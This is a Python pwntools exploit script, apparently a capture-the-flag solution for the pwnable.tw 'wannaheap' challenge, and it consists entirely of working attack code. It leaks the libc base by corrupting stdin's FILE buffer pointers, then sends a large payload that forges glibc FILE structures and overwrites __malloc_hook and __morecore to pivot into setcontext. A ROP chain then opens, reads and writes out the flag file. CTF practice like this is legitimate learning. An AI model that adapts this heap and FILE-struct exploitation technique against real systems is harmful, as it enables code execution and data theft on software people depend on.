from pwn import *

io = remote('chall.pwnable.tw', 10305)

libc = ELF('./libc-4e5dfd832191073e18a09728f68666b6465eeacd.so')

context.log_level = 'debug'

# write null byte to _IO_2_1_stdin_->_IO_buf_base
mmap_size = 0x314000
max_mmap_size = 0x313370
null_byte_offset = libc.sym['_IO_2_1_stdin_'] + mmap_size + 0x28

# leak base address of libc
io.recvuntil('Size :')
io.sendline(str(null_byte_offset))
io.recvuntil('Size :')
io.sendline(str(max_mmap_size))
io.recvuntil('Content :')
io.send('A')

io.recvuntil('> ')
io.send(b'F')

io.recvuntil('> ')
io.send(b'\xa0')
io.recvuntil('> ')
io.send(b'A')
io.recvuntil('key :')
io.send(b'1')
io.wait(0.1)
io.send(b'\n')
io.recvuntil('data :')
io.send(b'A' * 0x1)

io.recvuntil('> ')
io.send(b'\xa0')
io.recvuntil('> ')
io.send(b'A')
io.recvuntil('key :')
io.send(b'3')
io.wait(0.1)
io.send(b'\n')
io.recvuntil('data :')
io.send(b'A' * 0x1)

io.recvuntil('> ')
io.send(b'\xa0')
io.recvuntil('> ')
io.send(b'A')
io.recvuntil('key :')
io.send(b'2')
io.wait(0.1)
io.send(b'\n')
io.recvuntil('data :')
io.send(b'\x01')

io.recvuntil('> ')
io.send(b'R')
io.recvuntil('key:')
io.send(b'2')
io.wait(0.1)
io.send(b'\n')
io.recvuntil('data : ')
libc_leak = u64(io.recv(0x6) + b'\0\0')
libc.address = libc_leak - 0x3c3701
# print(hex(libc.address))
# input()

# Now, we can write payload to _IO_2_1_stdin_->_IO_buf_end
# generate payload

call_morecore = libc.address + 0x843e1
mov_rdi_rax = libc.address + 0x76006
setcontext_init = libc.sym['setcontext'] + 0x2e

pop_rax = libc.address + 0x3a998
fake_rsp_addr = libc.address + 0x3c2708
flag_file_addr = libc.sym['_IO_2_1_stdout_'] + 0x188
O_RDONLY = 0x0

ret = pop_rax
rbx = 0
rcx = 0
rdx = 0
rdi = flag_file_addr
rsi = O_RDONLY
rsp = fake_rsp_addr

# preserve _IO_2_1_stdin_
payload = p64(libc.sym['_IO_2_1_stdin_'] + 0x1000) + p64(0) * 5 + p64(0x1000000000) + p64(0xffffffffffffffff) + p64(0)
payload += p64(libc.address + 0x3c3770) + p64(0xffffffffffffffff) + p64(0) + p64(libc.address + 0x3c19a0)
payload += p64(0) * 3 + p64(0xffffffff) + p64(0) * 2 + p64(libc.sym['_IO_file_jumps']) + p64(0) * 38
payload += p64(libc.sym['_IO_wfile_jumps']) + p64(0) + p64(libc.address + 0x88680) + p64(libc.address + 0x88260)

# overwrite __malloc_hook -> __morecore
payload += p64(call_morecore) + p64(0)

# preserve heap
payload += p64(0x100000000) + p64(0) * 10 + p64(libc.sym['_IO_2_1_stdin_'] + 0x1740) + p64(0)
for addr in range(libc.address + 0x3c1b58, libc.address + 0x3c2348, 0x10):
    payload += p64(addr) * 2
payload += p64(0) * 2 + p64(libc.address + 0x3c1b00) + p64(0) + p64(1) + p64(0x21000) * 2

# overwirte __morecore -> setcontext
payload += p64(mov_rdi_rax) + p64(setcontext_init) + p64(libc.address + 0x18c04e) * 2 + p64(0) * 2
payload += p64(0) + p64(1) + p64(2) + p64(libc.address + 0x3c4498) + p64(0) + p64(0xffffffffffffffff)

# setcontext
payload += p64(libc.address + 0x3c05a0) + p64(rdi) + p64(rsi)
payload += p64(libc.address + 0x3bec20) + p64(rbx) + p64(rdx)
payload += p64(libc.address + 0x3bea60) + p64(rcx) + p64(rsp) + p64(ret)
payload += p64(libc.address + 0x3bf0c0) + p64(libc.address + 0x3bf140) + p64(libc.address + 0x3bf200)
payload += p64(libc.address + 0x3bf280) + p64(libc.address + 0x3bf2e0) + p64(libc.address + 0x175860)
payload += p64(libc.address + 0x174960) + p64(libc.address + 0x174f60) + p64(libc.address + 0x18c86c) * 13

# preserve _IO_list_all
payload += p64(0) * 3 + p64(libc.sym['_IO_2_1_stderr_']) + p64(0) * 3

# preserve _IO_2_1_stderr_
payload += p64(0xfbad2086) + p64(0) * 12 + p64(libc.address + 0x3c2600) + p64(2) + p64(0xffffffffffffffff)
payload += p64(0) + p64(libc.address + 0x3c3750) + p64(0xffffffffffffffff) + p64(0)
payload += p64(libc.address + 0x3c1640) + p64(0) * 6 + p64(libc.address + 0x3be400)

# preserve _IO_2_1_stdout_
payload += p64(0xfbad28a7) + p64(libc.address + 0x3c2683) * 7 + p64(libc.address + 0x3c2684)
payload += p64(0) * 4 + p64(libc.address + 0x3c18c0) + p64(1) + p64(0xffffffffffffffff)
payload += p64(0) + p64(libc.address + 0x3c3760) + p64(0xffffffffffffffff) + p64(0) + p64(libc.address + 0x3c1780)
payload += p64(0) * 3 + p64(0xffffffff) + p64(0) * 2 + p64(libc.address + 0x3be400)

# preserve stderr & stdout & stdin
payload += p64(libc.address + 0x3c2520) + p64(libc.address + 0x3c2600)
payload += p64(libc.address + 0x3c18c0) + p64(libc.address + 0x20730)

# generate rop gadget
read_syscall_num = 0x0
write_syscall_num = 0x1
open_syscall_num = 0x2
syscall = libc.address + 0xbc765
pop_rdi = libc.address + 0x1fd7a
pop_rsi = libc.address + 0x1fcbd
pop_rdx = libc.address + 0x1b92
STDIN_FILENO = 0x0
flag_fd = 0x1
flag_file_name = b'/home/wannaheap/flag\0'
flag_addr = flag_file_addr + len(flag_file_name)
flag_length = 0x40

# open("/home/wannaheap/flag", O_RDONLY)
rop = p64(0) + p64(open_syscall_num)
rop += p64(syscall)
# read(fd, flag_addr, flag_length)
rop += p64(pop_rax) + p64(read_syscall_num)
rop += p64(pop_rdi) + p64(flag_fd)
rop += p64(pop_rsi) + p64(flag_addr)
rop += p64(pop_rdx) + p64(flag_length)
rop += p64(syscall)
# write(0, flag_addr, flag_length)
rop += p64(pop_rax) + p64(write_syscall_num)
rop += p64(pop_rdi) + p64(STDIN_FILENO)
rop += p64(syscall)
rop += flag_file_name

payload += rop

# send payload
io.send(p64(libc.sym['_IO_2_1_stdin_'] + 0x1000))
io.wait(1)
io.send(payload)
io.wait(1)
io.send(b'A')
io.wait(0.1)
io.send(b'4')
io.wait(0.1)
io.send(b'\n')

io.interactive()